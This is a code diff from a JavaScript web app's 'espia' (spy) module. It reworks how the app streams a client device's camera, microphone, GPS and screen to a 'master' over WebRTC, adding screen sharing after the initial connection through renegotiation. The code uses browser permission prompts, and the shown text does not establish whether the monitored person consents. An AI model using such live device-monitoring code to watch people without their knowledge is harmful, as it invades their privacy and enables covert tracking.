@@ -2394,45 +2394,74 @@ const Session = (() => {
               });
             } catch(e) { console.warn('[espia WH] solo audio fallo:', e.message); }
           }
-          // [v2.13.72] Volver al modelo secuencial pero con timeout. WebRTC
-          // replaceTrack en transceiver vacío NO dispara ontrack en el master,
-          // entonces la pantalla nunca llegaba aunque el cliente la enviara.
-          // Solución: esperar getDisplayMedia hasta 10s ANTES de crear answer.
-          // Si user acepta rápido → pantalla incluida en SDP correctamente.
-          // Si tarda >10s o rechaza → seguir sin pantalla.
+          // [v2.13.73 RENEGOCIACIÓN] cam/mic/GPS son 100% independientes
+          // de pantalla. Conexión inicial SIN pantalla. Pantalla se pide
+          // ASYNC y cuando llega, dispara onnegotiationneeded → reneg SDP.
           if (!window._espiaCliWH.streams.userMedia) {
             await window._espiaCliWHCerrar('sin_streams');
             return;
-          }
-          // Pedir pantalla con timeout 10s. NO await infinito.
-          if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
-            try {
-              console.log('[espia WH] solicitando pantalla (timeout 10s)...');
-              const displayPromise = navigator.mediaDevices.getDisplayMedia({
-                video: { frameRate: { ideal: 15 } }, audio: false
-              });
-              const timeoutPromise = new Promise((_, rej) => setTimeout(() => rej(new Error('timeout 10s')), 10000));
-              window._espiaCliWH.streams.display = await Promise.race([displayPromise, timeoutPromise]);
-              const trcks = window._espiaCliWH.streams.display.getVideoTracks();
-              console.log('[espia WH] pantalla OK · tracks:', trcks.length, 'surface:', trcks[0]?.getSettings?.()?.displaySurface);
-            } catch(eS) {
-              console.warn('[espia WH] sin pantalla:', eS.message);
-            }
-          } else {
-            console.log('[espia WH] getDisplayMedia no disponible (iOS Safari <17?)');
           }
           const pc = new RTCPeerConnection({
             iceServers: [{ urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'] }]
           });
           window._espiaCliWH.pc = pc;
+          // Flag para que onnegotiationneeded no dispare en el setup inicial
+          window._espiaCliWH._setupInicialDone = false;
+          window._espiaCliWH._renegEnCurso = false;
           if (window._espiaCliWH.streams.userMedia) {
             window._espiaCliWH.streams.userMedia.getTracks().forEach(t => pc.addTrack(t, window._espiaCliWH.streams.userMedia));
           }
-          if (window._espiaCliWH.streams.display) {
-            window._espiaCliWH.streams.display.getTracks().forEach(t => {
-              pc.addTrack(t, window._espiaCliWH.streams.display);
-              t.onended = () => console.log('[espia WH] user detuvo compartir pantalla');
-            });
+          // Handler de renegotiación — se dispara cuando addTrack post-setup
+          pc.onnegotiationneeded = async () => {
+            if (!window._espiaCliWH || !window._espiaCliWH._setupInicialDone) return; // ignorar la inicial
+            if (window._espiaCliWH._renegEnCurso) return;
+            window._espiaCliWH._renegEnCurso = true;
+            try {
+              console.log('[espia WH reneg] generando nueva offer con tracks actualizados');
+              const offer = await pc.createOffer();
+              await pc.setLocalDescription(offer);
+              await _espiaCliWHPost('espiaSubirRenegOferta', { sesionId, sdp: JSON.stringify(offer) });
+              // Polling cada 600ms hasta que master conteste
+              const buscarAns = setInterval(async () => {
+                if (!window._espiaCliWH) { clearInterval(buscarAns); return; }
+                try {
+                  const r = await _espiaCliWHPost('espiaLeerRenegRespuesta', { sesionId });
+                  if (r?.sdpRenegRespuesta) {
+                    clearInterval(buscarAns);
+                    const ans = JSON.parse(r.sdpRenegRespuesta);
+                    await pc.setRemoteDescription(ans);
+                    console.log('[espia WH reneg] respuesta aplicada · pantalla negociada ✓');
+                    window._espiaCliWH._renegEnCurso = false;
+                  }
+                } catch(e) { console.warn('[espia WH reneg poll]', e?.message); }
+              }, 600);
+              // Timeout de seguridad 30s
+              setTimeout(() => { clearInterval(buscarAns); window._espiaCliWH && (window._espiaCliWH._renegEnCurso = false); }, 30000);
+            } catch(eR) {
+              console.warn('[espia WH reneg] falló:', eR?.message);
+              window._espiaCliWH && (window._espiaCliWH._renegEnCurso = false);
+            }
+          };
+          // [v2.13.73] Lanzar getDisplayMedia ASYNC sin bloquear el flow.
+          // Cuando llegue el track, addTrack dispara onnegotiationneeded.
+          if (navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === 'function') {
+            (async () => {
+              try {
+                console.log('[espia WH] solicitando pantalla async (sin timeout)...');
+                const screen = await navigator.mediaDevices.getDisplayMedia({
+                  video: { frameRate: { ideal: 15 } }, audio: false
+                });
+                if (!window._espiaCliWH) return;
+                window._espiaCliWH.streams.display = screen;
+                screen.getTracks().forEach(t => {
+                  pc.addTrack(t, screen);
+                  t.onended = () => console.log('[espia WH] user detuvo compartir pantalla');
+                });
+                console.log('[espia WH] pantalla agregada · onnegotiationneeded disparará reneg');
+              } catch(eS) { console.warn('[espia WH] pantalla rechazada o falló:', eS.message); }
+            })();
+          } else {
+            console.log('[espia WH] getDisplayMedia no disponible');
           }
           const gpsCh = pc.createDataChannel('gps');
           window._espiaCliWH.gpsCh = gpsCh;
@@ -2527,6 +2556,10 @@ const Session = (() => {
                 await _espiaCliWHPost('espiaSubirRespuesta', { sesionId, sdp: JSON.stringify(answer) });
                 clearInterval(window._espiaCliWH.pollTimerOferta);
                 window._espiaCliWH.pollTimerOferta = null;
+                // [v2.13.73] Marcar setup inicial completo. Desde ahora,
+                // cualquier addTrack disparará renegociación.
+                if (window._espiaCliWH) window._espiaCliWH._setupInicialDone = true;
+                console.log('[espia WH] setup inicial completo · onnegotiationneeded activo');
               }
             } catch(e) { console.warn('[espia WH poll oferta]', e?.message); }
           }, 800);
